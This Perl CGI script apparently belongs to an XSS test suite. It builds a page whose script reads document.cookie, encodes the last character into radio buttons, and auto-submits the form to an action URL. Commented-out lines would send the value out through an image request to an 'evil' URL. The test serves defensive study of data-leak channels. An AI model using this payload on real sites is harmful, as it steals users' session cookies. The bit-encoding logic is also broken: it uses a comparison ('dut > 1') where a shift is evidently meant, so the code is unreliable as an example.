#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Tests storing data in radio-button-field";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
<pre>
	<form name="testform2" action="$actionurl">
		x1: <input type="radio" name="x1" value="0"> <input type="radio" name="x1" value="1">
		x2: <input type="radio" name="x2" value="0"> <input type="radio" name="x2" value="1">
		x3: <input type="radio" name="x3" value="0"> <input type="radio" name="x3" value="1">
		x4: <input type="radio" name="x4" value="0"> <input type="radio" name="x4" value="1">
		x5: <input type="radio" name="x5" value="0"> <input type="radio" name="x5" value="1">
		x6: <input type="radio" name="x6" value="0"> <input type="radio" name="x6" value="1">
		x7: <input type="radio" name="x7" value="0"> <input type="radio" name="x7" value="1">
		x8: <input type="radio" name="x8" value="0"> <input type="radio" name="x8" value="1">
	</form>
</pre>
    <script type="text/javascript">

		
		var mycookie = $evil;
		var dut = mycookie.substr(mycookie.length-1, 1);
		
		document.getElementById("testptag").innerHTML = "mycookie = '" + mycookie + "' dut = '" + dut + "'";
		
		var myform = document.testform2;
		var bit = dut & 1;
		myform.x1[bit].checked = true;
		dut = dut > 1;
		
		bit = dut & 1;		
		myform.x2[bit].checked = true;
		dut = dut > 1;
		
		bit = dut & 1;		
		myform.x3[bit].checked = true;
		dut = dut > 1;
		
		bit = dut & 1;		
		myform.x4[bit].checked = true;
		dut = dut > 1;
		
		bit = dut & 1;		
		myform.x5[bit].checked = true;
		dut = dut > 1;
		
		bit = dut & 1;		
		myform.x6[bit].checked = true;
		dut = dut > 1;
		
		bit = dut & 1;		
		myform.x7[bit].checked = true;
		dut = dut > 1;
		
		bit = dut & 1;		
		myform.x8[bit].checked = true;
		dut = dut > 1;

/*
		var url = "$imgevilurl?normal=" + bit;
		document.images[0].src = url;
*/
/*		
		var reportdut = document.getElementById("testptag").innerHTML;
		
		var url = "$imgevilurl?normal=" + reportdut;
		document.images[0].src = url;
*/
		myform.submit();
		
    </script>
|;

require "xss_basic_footer.pl";
